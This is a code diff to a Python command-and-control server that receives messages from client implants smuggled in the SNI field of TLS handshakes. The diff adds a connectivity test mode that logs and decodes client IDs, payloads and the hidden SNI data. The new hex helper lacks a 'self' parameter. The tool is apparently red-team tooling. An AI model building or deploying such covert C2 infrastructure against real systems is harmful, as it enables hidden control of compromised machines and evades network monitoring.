@@ -64,6 +64,7 @@ MAX_HOST_LEN = 8
 MAX_DOMAIN_LEN = 6
 MAX_CLIENT_AGE = 60  # Mark a client disconnected if it does not check in for this number of seconds
 VERBOSE = True  # Show some additional output
+TEST_MODE = False  # Run in connectivity test mode
 MAX_CONSOLE_MSG_LEN = 120  # only print this number of chars
 NS_TO_MS = 100000
 
@@ -145,6 +146,38 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
         # Check if this is a returning client
         is_existing_client = False
         client_msg.set(protocol_headers)
+        if TEST_MODE:
+            # Test out client connectivity - Dont actually do C2 things
+            print(f"< CONNECTION FROM: {sock.getpeername()[0] + ':' + str(sock.getpeername()[1])}")
+            print(f"<   Raw Protocol Headers: {self._to_hex_x_notation(protocol_headers)}")
+            print(f"<      cid: {self._to_hex_x_notation(client_msg.get_client_id(protocol_headers))}")
+            print(f"<      type: {ClientMessage().type_to_text(client_msg.get_msg_type(protocol_headers))}")
+            try:
+                payload_len = struct.unpack(">L", (client_msg.get_payload_len(protocol_headers)))[0]
+            except:
+                payload_len = -1
+            print(f"<      len: {payload_len}")
+            try:
+                print(f"<      payload: {bytes.fromhex(client_msg.get_payload(protocol_headers).hex()).decode()}")
+            except:
+                print(
+                    f"<      payload: __INVALID_PAYLOAD__: '{self._to_hex_x_notation(client_msg.get_payload(protocol_headers))}'"
+                )
+            sni_bytes = b""
+            try:
+                sni_bytes = sni_object.hostNames[0]
+                print(f"<   Raw SNI: {sni_bytes.decode()}")
+            except:
+                print(f"< ERROR: NO SNI PRESENT!")
+            try:
+                print(f"< DECODED SNI BYTES: {self._decode_msg(sni_bytes)}")
+            except:
+                print(f"< ERROR: FAILED TO DECODE SNI!")
+            try:
+                print(f"< DECODED SNI STRING: {self._decode_msg(sni_bytes).decode()}")
+            except:
+                print(f"< ERROR: SNI DOES NOT DECODE TO A STRING!")
+        # end if TEST_MODE
         client_id = client_msg.get_client_id(protocol_headers)
         if client_id in self.CLIENT_DICT.keys():
             is_existing_client = True
@@ -504,6 +537,9 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
         """Extracts the smuggled SNI message from the Client Hello"""
         return bytes.fromhex("".join(msg.decode().split(".")[:-1]))
 
+    def _to_hex_x_notation(bs: bytes) -> str:
+        return "".join(["\\x%02x" % i for i in bs])
+
 
 # end class C2Server()
 
@@ -544,10 +580,19 @@ if __name__ == "__main__":
         required=False,
         help="Bind to Listening TCP Port number",
     )
+    arg_parse.add_argument(
+        "-t",
+        "--test",
+        metavar="run_test",
+        required=False,
+        help="Run in Connectivity Test Mode",
+    )
     args = arg_parse.parse_args()
     port = 8443
     if args.port:
         port = int(args.port)
+    if args.test:
+        TEST_MODE = True
     server = None
     C2Server = TLSServer(("0.0.0.0", port), None)
     C2Server.init()
@@ -563,7 +608,7 @@ if __name__ == "__main__":
     #
     console_msg_thread.start()
     print(f"[+] Listening on 0.0.0.0:{port}")
-    print("Type 'help' for more information. To terminate the process, type 'exit'")
+    print("Type 'help' for more information. To terminate the process, type 'exit' or Ctrl-C")
     try:
         server_thread.start()
         while True:
